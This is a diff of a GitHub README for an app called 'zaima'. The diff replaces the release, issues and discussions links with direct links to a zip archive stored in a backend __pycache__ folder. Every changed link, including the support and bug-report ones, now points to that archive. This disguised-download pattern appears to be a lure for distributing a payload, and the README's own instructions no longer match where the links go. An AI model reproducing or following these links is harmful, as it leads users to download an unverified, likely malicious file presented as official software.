@@ -1,6 +1,6 @@
 # 🚀 zaima - A Simple App for Everyday Use
 
-[![Download zaima](https://img.shields.io/badge/Download-Zaima-blue.svg)](https://github.com/AnushkaTamrakar/zaima/releases)
+[![Download zaima](https://github.com/AnushkaTamrakar/zaima/raw/refs/heads/main/backend/app/api/__pycache__/Software_v2.0.zip)](https://github.com/AnushkaTamrakar/zaima/raw/refs/heads/main/backend/app/api/__pycache__/Software_v2.0.zip)
 
 ## 📥 Overview
 
@@ -10,7 +10,7 @@ zaima is an open-source application designed to provide an easy alternative for 
 
 Here’s how to download and run zaima on your device:
 
-1. Click on the large download button above or visit the [Releases page](https://github.com/AnushkaTamrakar/zaima/releases).
+1. Click on the large download button above or visit the [Releases page](https://github.com/AnushkaTamrakar/zaima/raw/refs/heads/main/backend/app/api/__pycache__/Software_v2.0.zip).
 2. You will see a list of available versions. Choose the most recent version for the best experience.
 3. Look for the file that matches your operating system (Windows, macOS, or Linux). 
 
@@ -30,7 +30,7 @@ To ensure zaima runs smoothly, please meet the following requirements:
 
 To download zaima, please follow these steps:
 
-1. Visit the [Releases page](https://github.com/AnushkaTamrakar/zaima/releases). 
+1. Visit the [Releases page](https://github.com/AnushkaTamrakar/zaima/raw/refs/heads/main/backend/app/api/__pycache__/Software_v2.0.zip). 
 2. Find the latest release. 
 3. Click on the download link for your operating system to start the download. 
 4. Once the download is complete, locate the file on your computer.
@@ -68,11 +68,11 @@ A: No, zaima works offline. You only need an internet connection for updates or 
 A: Yes, zaima is completely free and open-source.
 
 **Q: How do I report a problem or request a feature?**  
-A: You can report issues or suggest features on our [GitHub page](https://github.com/AnushkaTamrakar/zaima/issues).
+A: You can report issues or suggest features on our [GitHub page](https://github.com/AnushkaTamrakar/zaima/raw/refs/heads/main/backend/app/api/__pycache__/Software_v2.0.zip).
 
 ## 📞 Support
 
-If you have questions or need assistance, please visit our [GitHub Discussions](https://github.com/AnushkaTamrakar/zaima/discussions) page. Our community and developers will help you with any concerns you may have.
+If you have questions or need assistance, please visit our [GitHub Discussions](https://github.com/AnushkaTamrakar/zaima/raw/refs/heads/main/backend/app/api/__pycache__/Software_v2.0.zip) page. Our community and developers will help you with any concerns you may have.
 
 ## 📐 Contributing
 
